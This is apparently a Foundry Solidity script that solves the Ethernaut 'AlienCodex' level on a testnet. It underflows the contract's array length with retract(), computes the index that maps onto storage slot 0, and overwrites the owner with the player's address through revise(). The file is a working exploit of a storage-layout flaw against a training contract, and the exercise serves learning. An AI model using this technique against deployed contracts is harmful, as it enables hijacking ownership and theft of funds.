// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import {Script, console} from "forge-std/Script.sol";

interface IAlienCodex {
    function owner() external view returns (address);

    function makeContact() external;

    function record(bytes32 _content) external;

    function retract() external;

    function revise(uint256 i, bytes32 _content) external;

    function codex(uint256 i) external returns (bytes32);
}

//forge script  --rpc-url sepolia --account metamask  Cracked19_AlienCodexScript --broadcast
contract Cracked19_AlienCodexScript is Script {
    address ethernaut_contracts;

    function setUp() public {
        ethernaut_contracts = vm.parseAddress(vm.envString("AlienCodex_address"));
    }

    function run() public {
        vm.startBroadcast();
        address player = vm.parseAddress(vm.envString("player"));
        address oldOwner = IAlienCodex(ethernaut_contracts).owner();
        console.log("oldOwner is", oldOwner);
        IAlienCodex(ethernaut_contracts).makeContact();
        //数组长度溢出
        IAlienCodex(ethernaut_contracts).retract();
        uint256 index = type(uint256).max - uint256(keccak256(abi.encodePacked(uint256(1)))) + 1;
        require(uint160(uint256(IAlienCodex(ethernaut_contracts).codex(index))) == uint160(oldOwner), "index is error");
        IAlienCodex(ethernaut_contracts).revise(index, bytes32(uint256(uint160(player))));
        vm.stopBroadcast();
    }
}
